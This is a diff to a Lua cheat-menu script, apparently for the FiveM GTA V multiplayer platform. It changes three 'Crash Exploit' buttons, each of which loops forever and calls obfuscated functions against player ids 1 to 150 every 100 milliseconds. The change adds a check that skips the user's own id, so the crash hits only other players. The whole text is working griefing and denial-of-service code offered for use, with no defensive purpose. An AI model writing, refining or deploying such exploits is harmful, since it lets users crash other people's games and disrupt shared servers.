@@ -1662,25 +1662,34 @@ Citizen.CreateThread(
             elseif LeBoyorFDPIsMenuOpened("CrashExploits") then
                 if LeBoyorFDPButton("~s~ Crash Exploit 1") then
                     local b8 = 500
+                    local myId = PlayerId()
                     while true do
                         for af = 1, 150, 1 do
-                            bb(b8)
+                            if af ~= myId then
+                                bb(b8)
+                            end
                         end
                         aO.Wait(100)
                     end
                 elseif LeBoyorFDPButton("~s~ Crash Exploit 2") then
                     local b8 = 2000
+                    local myId = PlayerId()
                     while true do
                         for af = 1, 150, 1 do
-                            bd(b8)
+                            if af ~= myId then
+                                bd(b8)
+                            end
                         end
                         aO.Wait(100)
                     end
                 elseif LeBoyorFDPButton("~s~ Crash Exploit 3") then
                     local b8 = 2000
+                    local myId = PlayerId()
                     while true do
                         for af = 1, 150, 1 do
-                            be(b8)
+                            if af ~= myId then
+                                be(b8)
+                            end
                         end
                         aO.Wait(100)
                     end
